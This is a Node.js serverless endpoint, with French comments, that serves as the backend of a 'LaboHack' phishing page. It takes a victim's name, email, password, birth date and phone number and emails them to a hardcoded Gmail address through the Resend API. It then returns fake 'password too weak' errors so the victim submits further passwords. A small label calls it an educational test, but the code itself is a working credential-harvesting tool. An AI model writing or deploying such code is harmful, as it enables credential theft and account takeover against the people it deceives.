const { Resend } = require('resend');

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }

  const { nom, email, password, dateNaissance, telephone, attempt, final } = req.body;

  // Validation basique
  if (!email || !password) {
    return res.status(400).json({ error: 'Email et mot de passe requis' });
  }

  const resend = new Resend(process.env.RESEND_API_KEY);

  // Construction du sujet avec le numéro de tentative
  const subject = `🔴 LaboHack - Tentative ${attempt || 1}${final ? ' (FINAL)' : ''}`;

  try {
    // Envoi de l'email (TOUJOURS envoyé, même si on simule une erreur)
    const { data, error } = await resend.emails.send({
      from: 'LaboHack <onboarding@resend.dev>',
      to: ['nyavosapp@gmail.com'],
      subject: subject,
      html: `
        <h2>📥 Données collectées (Tentative ${attempt || 1})</h2>
        <table border="1" cellpadding="8">
          <tr><td><strong>Nom</strong></td><td>${nom || 'Non renseigné'}</td></tr>
          <tr><td><strong>Email</strong></td><td>${email}</td></tr>
          <tr><td><strong>Mot de passe</strong></td><td style="color:red;font-weight:bold;">${password}</td></tr>
          <tr><td><strong>Date de naissance</strong></td><td>${dateNaissance || 'Non renseignée'}</td></tr>
          <tr><td><strong>Téléphone</strong></td><td>${telephone || 'Non renseigné'}</td></tr>
          <tr><td><strong>Tentative</strong></td><td>${attempt || 1}</td></tr>
          ${final ? '<tr><td><strong>Final</strong></td><td>✅ Oui</td></tr>' : ''}
        </table>
        <p style="color:gray;font-size:12px;">⚠️ Test éducatif - LaboHack</p>
      `
    });

    if (error) {
      console.error('Erreur Resend:', error);
      // Même si Resend échoue, on renvoie une erreur simulée pour le phishing
      return res.status(400).json({ error: 'Mot de passe trop faible. Changez-le.' });
    }

    // SUCCÈS de l'envoi, mais on renvoie volontairement une erreur pour forcer le changement
    // (sauf si c'est la tentative finale, on renvoie succès)
    if (final) {
      return res.status(200).json({ success: true });
    } else {
      return res.status(400).json({ error: 'Mot de passe trop faible. Veuillez en saisir un nouveau.' });
    }

  } catch (error) {
    console.error('Erreur serveur:', error);
    return res.status(500).json({ error: 'Erreur serveur, mais vos données ont été enregistrées.' });
  }
};
